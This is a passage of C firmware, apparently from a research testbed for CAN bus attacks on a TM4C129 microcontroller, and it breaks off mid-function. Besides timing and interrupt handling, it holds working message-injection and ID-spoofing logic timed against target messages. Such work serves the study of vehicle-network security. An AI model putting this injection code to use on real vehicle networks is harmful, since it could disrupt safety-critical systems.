Ipsitakoley/tm4c129-canbus/sae-benchmark/timers.c
#define TXOBJECT_URGENT     2
#define TXOBJECT_5          HIGHEST_TX_PRIORITY
#define TXOBJECT_Target_1   PRIORITY_Target_1
#define TXOBJECT_Target_2   PRIORITY_Target_2
#define TXOBJECT_RESERVED1  6
#define TXOBJECT_10         7
#define TXOBJECT_RESERVED2  8
#define TXOBJECT_20         9
#define TXOBJECT_RESERVED3  10
#define TXOBJECT_100        11
#define TXOBJECT_RESERVED5  12
#define TXOBJECT_1000       13
#define RXOBJECT_RESET      14
#define TXOBJECT_RESET      RXOBJECT_RESET
#define RXOBJECT_RESERVED1  15
#define RXOBJECT            16

void do_attack_injection(void);


// The error routine that is called if the driver library encounters an error.
#ifdef DEBUG
void
__error__(char *pcFilename, uint32_t ui32Line)
{
}
#endif

void delay_ticks(uint32_t ticks)
{
    uint32_t start = 0;
    uint32_t end = 1;

    // in case of an overflow.
    while (end > start) { // loop in case of an overflow
        start = TimerValueGet(TIMER3_BASE, TIMER_A);
        end = start - ticks; // timer3 is a free-running, countdown timer.
    }
    while (start > end) {
        start = TimerValueGet(TIMER3_BASE, TIMER_A);
    }
}

void delay_us(uint32_t delay)
{
    delay_ticks(delay*TICKS_PER_US);
}

void delay_ms(uint32_t delay)
{
    delay_us(delay*1000);
}

static inline void got_CAN_msg_interrupt(uint32_t ID)
{
    uint32_t timer_val;

    if (g_ui32ExpCtrl & SYNC_MASK) {
        g_ui32PenultimateCANIntTimer = g_ui32LastCANIntTimer;
        g_ui32LastCANIntTimer = TimerValueGet(TIMER3_BASE, TIMER_A);
    } else {
        if (g_ui32ExpCtrl & ATTACK_MASK && g_reset == false) {
            // no sync, attack --> preceded message injection
            if ((PRECEDED_ID == ID && g_target_id == TARGET_ID) || (PRECEDED_ID_2 == ID && g_target_id == TARGET_ID_2)) {
                do_attack_injection();
            }
        }
    }

    switch(ID) {
        case RXOBJECT: g_bRXFlag = true; break;
#if defined(SEND_RESET)
        case TXOBJECT_RESET: g_bRESETFlag = true; break;
#endif
        case TXOBJECT_5: g_bTXFlag_5 = true; break;
        case TXOBJECT_Target_1: g_bTXTarget_1 = true; break;
        case TXOBJECT_Target_2: g_bTXTarget_2 = true; break;
        case TXOBJECT_10: g_bTXFlag_10 = true; break;
        case TXOBJECT_100: g_bTXFlag_100 = true; break;
        case TXOBJECT_1000: g_bTXFlag_1000 = true; break;
        default: g_bTXFlag = ID; break;
    }

    // This intends to count the number of messages since the last bus idle time.
    // TODO: It is a crude hack that may need tuning by changing the LATENCY definition.
    // A more clever solution would derive the expected timer value based on the length of
    // the received message, but we won't actually know that until (a) after that message is
    // received and (b) when the RX buffer is read in the main() busy-loop.
    if (g_ui32ExpCtrl & SYNC_0PHASE) {
        if (g_sync == SYNC_MODE_RESET) {
            timer_val = TimerValueGet(TIMER2_BASE, TIMER_A);
            if (g_target_id == TARGET_ID) {
                TimerLoadSet(TIMER2_BASE, TIMER_A, TARGET_XMIT_TIME);
            } else {
                TimerLoadSet(TIMER2_BASE, TIMER_A, TARGET_XMIT_TIME_2);
            }
            TimerEnable(TIMER2_BASE, TIMER_A);
            if (timer_val == 0) {
                g_msg_since_idle = 0;
            } else {
                g_msg_since_idle++;
            }
        }
    }

}

void CAN0IntHandler(void)
{
    uint32_t ui32Status;

    IntMasterDisable();

    while ((ui32Status = CANIntStatus(CAN0_BASE, CAN_INT_STS_CAUSE)) != 0) {

        if(ui32Status == CAN_INT_INTID_STATUS) {
            ui32Status = CANStatusGet(CAN0_BASE, CAN_STS_CONTROL);

            // if using abort on txerror, check for the tx error condition on the target ID
            // if an error occurs, just cancel the transmission blindly.
            if (g_ui32ExpCtrl & DISABLE_RETRANS_TXERR) {
                //uint8_t lec = ui32Status & CAN_STATUS_LEC_MSK;
                //if ( lec == CAN_STATUS_LEC_STUFF || lec == CAN_STATUS_LEC_BIT1 || lec == CAN_STATUS_LEC_BIT0 ) {
                if (ui32Status & CAN_STATUS_LEC_MSK) {
                    if (g_target_id == TARGET_ID ) {
                        CANMessageClear(CAN0_BASE, TXOBJECT_Target_1);
                    } else if (g_ui32ExpCtrl & ATTACK_TRANSITIVE) {
                        CANMessageClear(CAN0_BASE, TXOBJECT_Target_2);
                    }
                }
            }

            // Errors are handled in CANErrorHandler().
            g_ui32ErrFlag |= ui32Status;
        } else {
            got_CAN_msg_interrupt(ui32Status);
            CANIntClear(CAN0_BASE, ui32Status);
        }
    }
    IntMasterEnable();
}

void do_attack_injection()
{
    static uint16_t skip_cnt = 0;

    if ( skip_cnt % g_skip_attack == 0 ) {
        if ( g_target_id == TARGET_ID ) {
            CANMessageSet(CAN0_BASE, TXOBJECT_Target_1, &g_sCAN0TxMessage_Target_1, MSG_OBJ_TYPE_TX);
        } else {
            if (g_ui32ExpCtrl & ATTACK_TRANSITIVE) {
                CANMessageSet(CAN0_BASE, TXOBJECT_Target_2, &g_sCAN0TxMessage_Target_2, MSG_OBJ_TYPE_TX);
            }
        }
    }
    ++skip_cnt;

}

void send_messages(uint32_t count)
{
#if defined(SPORADIC_MSG_IAT)
    bool can_send_sporadic = false;
    if ( (count - g_last_sporadic_tx) > (SPORADIC_MSG_IAT/5) ) {
        can_send_sporadic = true;
    }
#endif

    if (g_reset == false) {
#if defined(SIMULATE_JITTER)
        delay_ticks(g_ui8TXMsgData_RESET[0]);
#endif
        if (HIGH_PRIO_ID < g_target_id ) {
            if (g_sCAN0TxMessage_5) {
                CANMessageSet(CAN0_BASE, TXOBJECT_5, g_sCAN0TxMessage_5, MSG_OBJ_TYPE_TX);
            }
            if (g_ui32ExpCtrl & ATTACK_MASK) {
                if (g_ui32ExpCtrl & (SYNC_PERIOD | SYNC_0PHASE) && g_sync == SYNC_MODE_SYNCHED) {
                    do_attack_injection();
                }
            }
        } else {
            if (g_ui32ExpCtrl & ATTACK_MASK) {
                if (g_ui32ExpCtrl & (SYNC_PERIOD | SYNC_0PHASE) && g_sync == SYNC_MODE_SYNCHED) {
                    do_attack_injection();
                }
            }
            if (g_sCAN0TxMessage_5) {
                CANMessageSet(CAN0_BASE, TXOBJECT_5, g_sCAN0TxMessage_5, MSG_OBJ_TYPE_TX);
            }
        }

        // spoof the first target's messages after transition, assume it is always a 5 or 10 ms periodic message...
        if ((g_ui32ExpCtrl & ATTACK_TRANSITIVE) && g_target_id == TARGET_ID_2 ) {
            if (TARGET_ID < 0xAF || count % 2 == 0) {
                CANMessageSet(CAN0_BASE, TXOBJECT_Target_1, &g_sCAN0TxMessage_Target_1, MSG_OBJ_TYPE_TX);
            }
        }

#if defined(SPORADIC_MSG_IAT)
        if (can_send_sporadic == true) {
            if (!g_ui8TXMsgData_RESET[0] || count % g_ui8TXMsgData_RESET[0] == 0) {
                CANMessageSet(CAN0_BASE, TXOBJECT_URGENT, g_sCAN0TxMessage_sporadic, MSG_OBJ_TYPE_TX);
                g_last_sporadic_tx = count;
                g_ui8TXMsgData_RESET[0]++;
            }
        }
#endif

        if ( count % 2 == 0 && g_sCAN0TxMessage_10) {
            CANMessageSet(CAN0_BASE, TXOBJECT_10, g_sCAN0TxMessage_10, MSG_OBJ_TYPE_TX);
        }

        if (count % 20 == 0 && g_sCAN0TxMessage_100) {
            CANMessageSet(CAN0_BASE, TXOBJECT_100, g_sCAN0TxMessage_100, MSG_OBJ_TYPE_TX);
        }

